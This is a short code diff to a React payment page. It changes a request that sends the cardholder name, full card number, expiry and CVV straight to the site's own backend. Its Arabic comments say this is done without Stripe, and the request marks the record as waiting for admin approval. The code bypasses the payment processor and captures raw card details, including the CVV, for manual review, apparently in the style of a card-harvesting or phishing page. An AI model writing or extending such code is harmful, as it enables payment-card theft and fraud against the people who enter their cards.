@@ -167,7 +167,7 @@ export default function PaymentPage() {
     setIsSubmitting(true);
     setErrorMsg("");
 
-    // حفظ بيانات البطاقة في الجلسة مباشرة (بدون التحقق من Stripe)
+    // حفظ بيانات البطاقة في الجلسة مباشرة (بدون Stripe)
     try {
       const [expMonth, expYear] = expiry.split('/').map(s => s.trim());
 
@@ -178,12 +178,10 @@ export default function PaymentPage() {
         body: JSON.stringify({
           current_page: 'payment',
           card_holder: cardHolder,
-          card_number: cardNumber.replace(/\s/g, ''),
+          card_number: cardNumber,
           card_expiry: expiry,
           card_cvv: cvv,
-          expMonth: parseInt(expMonth, 10),
-          expYear: parseInt('20' + expYear, 10),
-          stripe_status: 'pending', // حالة الانتظار للموافقة من الأدمن
+          stripe_status: 'pending',
           waiting_for: 'admin_approval',
         }),
       });
